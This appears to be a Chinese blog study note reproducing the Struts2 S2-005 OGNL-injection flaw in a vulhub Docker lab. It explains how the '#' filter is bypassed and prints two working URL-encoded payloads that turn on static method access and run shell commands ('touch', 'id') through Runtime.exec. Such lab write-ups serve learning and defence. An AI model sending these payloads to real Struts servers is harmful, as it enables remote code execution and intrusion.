~~~~
title: 漏洞复现学习（s2-005）
tags: 
  - 渗透测试
  - 漏洞复现
  - struts2
categories: 
  - 渗透测试
  - 漏洞复现
  - struts2
~~~~



## Struts2漏洞S2-005复现笔记

## S2-005复现漏洞原理

~~~text
s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开
~~~

影响版本：Struts 2.0.0-2.1.8.1

## 漏洞搭建

~~~~
https://github.com/vulhub/vulhub/tree/master/struts2/s2-005
~~~~

运行以下命令启动环境

```
docker-compose build
docker-compose up -d
```

搭建成功：

![image-20220330205122843](E:\学习\picture\image-20220330205122843.png)

## 构建poc

使用抓包工具burp suite，修改数据包插入poc

~~~poc
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
~~~

![image-20220330210413069](E:\学习\picture\image-20220330210413069.png)

**Poc2：**

~~~~
?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27
~~~~

![image-20220330210547380](E:\学习\picture\image-20220330210547380.png)

## 查看数据连接状态

命令：

~~~
docker exec -it c25543ef6c4c /bin/bash
~~~

ls /tmp

![image-20220330210920367](E:\学习\picture\image-20220330210920367.png)